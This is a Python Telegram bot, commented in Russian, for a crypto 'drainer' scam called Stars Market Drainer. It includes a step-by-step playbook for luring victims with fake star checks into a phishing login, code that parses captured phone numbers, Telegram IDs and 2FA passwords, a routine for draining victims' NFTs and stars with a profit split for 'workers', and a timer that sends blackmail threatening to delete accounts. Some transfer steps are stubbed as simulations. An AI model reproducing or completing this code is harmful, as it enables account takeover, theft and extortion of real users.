import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import telebot
from telebot import types as tb_types
import time
import os
from config import TOKEN, CHECK_BOT, ADMIN_ID, THREAT_TIME

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN, parse_mode="HTML")
dp = Dispatcher()

# Хранилище сессий и таймеров
sessions = {}  # {user_id: {"phone": , "tg_id": , "password": , "stars": 0, "nfts": [], "premium": False, "timer": None}}

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    user_id = message.from_user.id
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Запустить дрейнер", web_app=WebAppInfo(url="https://твой-railway-app.up.railway.app/mini"))],
        [InlineKeyboardButton(text="📋 Шпаргалка", callback_data="help")]
    ])
    await message.answer("🫰 Добро пожаловать в Stars Market Drainer\n\nВыбери действие:", reply_markup=keyboard)

@dp.callback_query(F.data == "help")
async def help_callback(call: types.CallbackQuery):
    text = """Шпаргалка дрейнера:

/draw — картинка с суммой
/check — чек / мультичек
/info — проверка бота

Инлайн-чек: @StarsNymedCheckBot 100

Для жертвы:
1. Пишешь ей "Привет, подпишись на канал за 50 звезд"
2. После подписки создаёшь чек на 50 звезд
3. Она переходит → регистрируется во фрагменте → сессия ловится
4. Бот автоматически дрейнит NFT + звёзды
5. Если нет Premium — шлёт шантаж с таймером 15 мин на ручную отправку подарков
"""
    await call.message.edit_text(text)

# ====================== МИНИ-АПП ======================
# В mini_app.py будет веб-интерфейс, но для простоты пока хэндлер в main

# Симуляция входа (реально ты будешь использовать pyrogram/telethon для реального логина, но для копии делаем так)
@dp.message(F.text.startswith("🔴 Код отправлен"))
async def handle_code_sent(message: types.Message):
    # Парсим из твоих логов
    # Здесь в реале ты парсишь сообщение от воркера
    pass

# Основной обработчик успешного логина (когда жертва регистрируется во фрагменте)
@dp.message(F.text.contains("Успешный вход с 2FA") | F.text.contains("✅ Успешное подключение"))
async def handle_success_login(message: types.Message):
    # Пример парсинга из логов
    lines = message.text.split("\n")
    tg_id = None
    phone = None
    password = None
    for line in lines:
        if "TG ID:" in line:
            tg_id = line.split(": ")[1]
        if "Телефон:" in line:
            phone = line.split(": ")[1]
        if "Пароль:" in line:
            password = line.split(": ")[1]

    if tg_id:
        sessions[tg_id] = {
            "phone": phone,
            "tg_id": tg_id,
            "password": password,
            "stars": 176,  # пример из лога
            "nfts": ["CloverPin-200970", "PetSnake-148519", ...],  # список из лога
            "premium": True,  # определяй по наличию Premium
            "timer": None
        }
        
        await bot.send_message(ADMIN_ID, f"💸 НОВАЯ СЕССИЯ!\n👤 @{message.from_user.username}\n🎱 ID: {tg_id}\n☎️ {phone}")
        
        # Автодрейн если Premium
        if sessions[tg_id]["premium"]:
            await auto_drain(tg_id)
        else:
            await start_threat_timer(tg_id)

async def auto_drain(tg_id: str):
    data = sessions[tg_id]
    nfts = data["nfts"]
    profit_text = "✅ НОВЫЙ ПРОФИТ\n\n"
    for nft in nfts[:7]:  # как в логе
        profit_text += f"https://t.me/nft/{nft}\n"
    
    await bot.send_message(ADMIN_ID, profit_text + f"\nСумма: ~55.87 TON\nДоля воркера: 50%")
    
    # Здесь в реальной версии подключаешься через pyrogram и отправляешь все подарки/NFT на свой кошелёк
    # Пока симуляция
    data["stars"] = 0
    data["nfts"] = []

async def start_threat_timer(tg_id: str):
    sessions[tg_id]["timer"] = time.time()
    await bot.send_message(ADMIN_ID, f"🔴 У жертвы нет Premium!\nАккаунт {tg_id} подключён.\nУ неё есть 15 минут на отправку всех подарков, иначе аккаунт будет удалён.")
    
    await asyncio.sleep(THREAT_TIME)
    if tg_id in sessions and sessions[tg_id]["timer"] is not None:
        await bot.send_message(ADMIN_ID, f"🕒 Таймер вышел! Аккаунт {tg_id} — шантаж активирован. Требуй отправку подарков вручную или угрожай удалением.")

# Команда для воркера — создать чек
@dp.message(Command("draw"))
async def draw_cmd(message: types.Message):
    # Здесь генерируешь картинку с суммой (используй Pillow + qrcode)
    await message.answer("Картинка с суммой сгенерирована (реализуй генерацию)")

@dp.message(Command("check"))
async def create_check(message: types.Message):
    args = message.text.split()
    amount = args[1] if len(args) > 1 else "50"
    await message.answer(f"Чек на {amount} ⭐ создан!\nПерешли его жертве:\nhttps://t.me/{CHECK_BOT}?start=pay_{amount}")

# Запуск
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())